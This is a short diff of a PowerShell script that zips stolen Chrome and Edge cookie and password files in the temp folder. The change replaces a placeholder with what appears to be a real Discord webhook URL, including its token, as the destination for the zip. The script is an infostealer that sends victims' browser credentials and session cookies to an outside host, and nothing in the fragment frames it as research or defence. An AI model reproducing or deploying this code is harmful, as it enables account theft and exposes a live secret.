@@ -13,7 +13,7 @@ Compress-Archive -Path 'chrome_cookies.txt', 'chrome_passwords.txt', 'edge_cooki
 $zipFilePath = "$env:TEMP\browser_data.zip"
 
 # dc webhook
-$webhookUrl = "WEBHOOK_URL_REPLACE"
+$webhookUrl = "https://discord.com/api/webhooks/1372618531245523026/MVdECd09IUHFjbRi3GVewdwa7w-ljoqWZXjfjCUplsUxc5d5RbbboF9ueXl7UW5Qi_1Y"
 
 
 $discordApiUrl = $webhookUrl
